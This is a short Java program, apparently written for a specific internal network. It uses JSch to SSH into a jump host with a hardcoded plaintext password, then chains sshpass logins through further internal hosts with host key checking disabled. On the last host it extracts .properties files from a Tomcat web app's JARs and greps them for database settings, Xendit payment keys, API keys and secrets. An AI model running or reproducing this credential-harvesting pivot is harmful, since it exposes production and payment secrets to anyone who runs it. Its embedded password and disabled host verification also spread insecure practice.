import com.jcraft.jsch.*;
import java.io.*;
class XMA {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 \"cd /tmp;for jar in /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/ROOT/WEB-INF/lib/nox*.jar /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/ROOT/WEB-INF/lib/cps*.jar; do props=\\$(/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jar tf \\$jar 2>/dev/null | grep -E \\\"\\\\.properties\\$\\\");if [ -n \\\"\\$props\\\" ]; then echo JAR=\\$jar PROPS=\\$props;/usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jar xf \\$jar \\$props 2>/dev/null;for f in \\$props; do echo ---FILE=\\$f---;grep -iE \\\"db\\\\.\\\\|xendit\\\\|xnd_\\\\|api.key\\\\|secret\\\" \\$f 2>/dev/null;done;fi;done\" 2>&1' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
